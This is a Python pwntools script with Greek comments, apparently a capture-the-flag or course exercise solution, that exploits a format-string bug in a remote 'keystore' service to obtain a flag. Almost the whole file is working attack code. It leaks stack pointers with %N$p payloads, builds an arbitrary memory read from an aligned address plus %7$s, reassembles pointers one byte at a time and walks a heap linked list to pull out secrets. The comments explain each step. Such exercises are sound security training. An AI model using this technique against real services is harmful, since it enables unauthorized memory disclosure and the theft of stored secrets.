#!/usr/bin/env python3
"""Exploit keystore via stack-format-string arbitrary read and list walk."""

# pwn: βιβλιοθήκη για exploit development (remote connections, packing bytes κλπ)
from pwn import remote, context, p32, u32
from pwnlib.exception import PwnlibException
import re
import sys

# --- Στόχος ---
HOST = "shell.hackintro.di.uoa.gr"
PORT = 52667

# Το format string που στέλνουμε μπαίνει στο stack ως το 7ο argument του printf.
# Άρα με %7$s μπορούμε να δείξουμε σε όποια διεύθυνση θέλουμε (arbitrary read).
BUFFER_OFFSET = 7

# 3 bytes padding ώστε η 32-bit διεύθυνση που βάζουμε μετά να είναι
# 4-byte aligned μέσα στο buffer (απαίτηση του x86 format string trick).
ALIGN = b"123"


def parse_hex_pointer(line):
    """Εξάγει την πρώτη hex τιμή (0x...) από μια γραμμή εξόδου.
    Επιστρέφει int, ή 0 αν δεν βρεθεί."""
    match = re.search(rb"0x([0-9a-fA-F]+)", line)
    if not match:
        return 0
    return int(match.group(0), 16)


class KeystoreExploit:
    """Ενσωματώνει όλη τη λογική του exploit για το keystore service."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.p = None  # το pwntools remote object

    def connect(self):
        """Συνδέεται στο remote service και περιμένει το πρώτο prompt '>'."""
        self.p = remote(self.host, self.port, timeout=4)
        self.p.recvuntil(b">", timeout=2)

    def close(self):
        """Κλείνει τη σύνδεση αν είναι ανοιχτή."""
        if self.p is not None:
            self.p.close()

    def _send_find_and_recvline(self, payload):
        """Στέλνει 'find <payload>' στο service και επιστρέφει την απάντηση.

        Εδώ βρίσκεται το format string bug: το service περνάει το input
        απευθείας στο printf() χωρίς sanitization, οπότε format specifiers
        όπως %p, %s, %N$p κλπ εκτελούνται κανονικά.
        """
        try:
            self.p.sendline(b"find " + payload)
            return self.p.recvline(timeout=2)
        except (EOFError, PwnlibException):
            return b""

    def leak_stack_index(self, index):
        """Διαβάζει την τιμή του N-οστού slot του stack ως pointer (hex).

        Χρησιμοποιεί το format specifier %N$p που τυπώνει το N-οστό
        argument του printf ως hex pointer — χωρίς να χρειαστεί να ξέρουμε
        εκ των προτέρων τη διεύθυνση.

        Παράδειγμα payload: b"123 %15$p"
        """
        line = self._send_find_and_recvline(ALIGN + b" %" + str(index).encode() + b"$p")
        return parse_hex_pointer(line)

    def arbitrary_read_raw(self, address):
        """Διαβάζει bytes από οποιαδήποτε διεύθυνση μνήμης (arbitrary read).

        Τεχνική:
          1. Γράφουμε την target διεύθυνση μέσα στο ίδιο το format buffer.
          2. Με %7$s λέμε στο printf: "τύπωσε σαν string αυτό που δείχνει
             ο 7ος pointer" — ο οποίος είναι ακριβώς η διεύθυνση που μόλις
             γράψαμε στο buffer.
          3. Αποτέλεσμα: το printf μας επιστρέφει τα bytes από εκείνη τη θέση.

        Payload: b"123" + pack(address) + b"%7$s"
        """
        if address <= 0 or address > 0xFFFFFFFF:
            return b""

        payload = ALIGN + p32(address) + f"%{BUFFER_OFFSET}$s".encode()
        line = self._send_find_and_recvline(payload)
        if not line:
            return b""

        # Αφαιρούμε το ALIGN prefix και τα 4 bytes της διεύθυνσης
        # για να κρατήσουμε μόνο τα δεδομένα που διαβάστηκαν.
        idx = line.find(ALIGN)
        if idx == -1:
            return b""

        data = line[idx + len(ALIGN) + 4 :]

        # Το service μπορεί να επιστρέψει ": not found" αν το string
        # που διάβασε μοιάζει με άγνωστο key — το κόβουμε.
        if b": not found" in data:
            data = data.split(b": not found", 1)[0]

        return data.rstrip(b"\r\n")

    def read_pointer(self, address):
        """Διαβάζει έναν 32-bit pointer από τη δοθείσα διεύθυνση.

        Πρόβλημα: το %s σταματά στο πρώτο null byte (\\x00), οπότε αν
        ο pointer περιέχει null bytes (π.χ. 0x0804a100), δεν μπορούμε
        να τον διαβάσουμε ολόκληρο με μία κλήση.

        Λύση: διαβάζουμε 1 byte τη φορά από address, address+1, +2, +3
        και συναρμολογούμε τον pointer με u32().
        """
        b0 = self.arbitrary_read_raw(address)
        b1 = self.arbitrary_read_raw(address + 1)
        b2 = self.arbitrary_read_raw(address + 2)
        b3 = self.arbitrary_read_raw(address + 3)

        raw = bytes(
            [
                b0[0] if b0 else 0,
                b1[0] if b1 else 0,
                b2[0] if b2 else 0,
                b3[0] if b3 else 0,
            ]
        )
        return u32(raw)

    def read_text(self, address):
        """Διαβάζει string από μια διεύθυνση και επιστρέφει μόνο
        εκτυπώσιμους χαρακτήρες (ASCII + latin-1)."""
        data = self.arbitrary_read_raw(address)
        if not data:
            return ""
        text = data.decode("latin-1", errors="ignore")
        # Κρατάμε μόνο printable χαρακτήρες για καθαρή έξοδο
        return "".join(ch for ch in text if ch == "\t" or ch == " " or 32 <= ord(ch) <= 126)

    def walk_list(self):
        """Κύρια συνάρτηση εκμετάλλευσης: περπατάει τη linked list του heap.

        Δομή του stack που εκμεταλλευόμαστε:
          %15$p → pointer στο key  του sentinel node
          %16$p → pointer στο val  του sentinel node
          %17$p → pointer στο next (= πρώτο πραγματικό node)

        Δομή κάθε node στο heap (32-bit):
          [ key_ptr  (4 bytes) ]
          [ val_ptr  (4 bytes) ]
          [ next_ptr (4 bytes) ]

        Στόχος: βρες το node με key="key" ή οποιοδήποτε περιέχει FLAG{...}.
        """

        # --- Leak αρχικών pointers από το stack ---
        sentinel_key_ptr = self.leak_stack_index(15)
        sentinel_val_ptr = self.leak_stack_index(16)
        current = self.leak_stack_index(17)  # πρώτο node της λίστας

        # Χρησιμοποιούμε τα high bits της διεύθυνσης για να ελέγξουμε
        # αν οι επόμενοι pointers ανήκουν στο ίδιο heap region.
        heap_hi = (current >> 24) if current else 0

        print(f"[+] Leak %15$p (sentinel.key): 0x{sentinel_key_ptr:08x}")
        print(f"[+] Leak %16$p (sentinel.val): 0x{sentinel_val_ptr:08x}")
        print(f"[+] Leak %17$p (sentinel.next): 0x{current:08x}")

        # --- Έλεγχος αν το flag είναι στο sentinel node ---
        sentinel_key = self.read_text(sentinel_key_ptr)
        sentinel_val = self.read_text(sentinel_val_ptr)
        print(f"[SENTINEL] key={sentinel_key} | val={sentinel_val}")

        if "FLAG{" in sentinel_key or "FLAG{" in sentinel_val:
            return sentinel_key if "FLAG{" in sentinel_key else sentinel_val

        # --- Traversal της linked list ---
        visited = set()  # αποφυγή infinite loop αν υπάρχει κύκλος

        for i in range(80):  # max 80 nodes για ασφάλεια
            if current == 0 or current in visited:
                break
            visited.add(current)

            # Διαβάζουμε τα 3 πεδία του τρέχοντος node
            key_ptr  = self.read_pointer(current)
            val_ptr  = self.read_pointer(current + 4)
            next_ptr = self.read_pointer(current + 8)

            key = self.read_text(key_ptr)
            val = self.read_text(val_ptr)

            print(
                f"[NODE {i:02d}] node=0x{current:08x} "
                f"key_ptr=0x{key_ptr:08x} val_ptr=0x{val_ptr:08x} next=0x{next_ptr:08x}"
            )
            print(f"          key={key} | val={val}")

            # Το challenge αποθηκεύει το μυστικό με key="key"
            if key == "key" and val:
                return val

            # Άμεση ανίχνευση flag σε key ή value
            if "FLAG{" in key:
                return key
            if "FLAG{" in val:
                return val

            # Έλεγχος εγκυρότητας next pointer — αποφυγή crash του remote
            if next_ptr < 0x10000 or next_ptr > 0xFFFFFFFF:
                break
            # Αν ο next pointer δείχνει εκτός του αναμενόμενου heap region, σταματάμε
            if heap_hi and (next_ptr >> 24) not in {heap_hi, heap_hi + 1, heap_hi - 1}:
                break

            current = next_ptr  # προχωράμε στο επόμενο node

        return ""  # flag δεν βρέθηκε


def main():
    # Απενεργοποιούμε τα verbose logs του pwntools για καθαρή έξοδο
    context.log_level = "error"

    exp = KeystoreExploit(HOST, PORT)
    try:
        exp.connect()
        flag = exp.walk_list()

        if flag:
            print("\n========================================")
            print(f"FLAG FOUND: {flag}")
            print("========================================")
        else:
            print("\n[-] Flag not found in traversed nodes.")

    except Exception as exc:
        print(f"[-] Exploit failed: {exc}")
        sys.exit(1)
    finally:
        exp.close()  # κλείνουμε πάντα τη σύνδεση


if __name__ == "__main__":
    main()
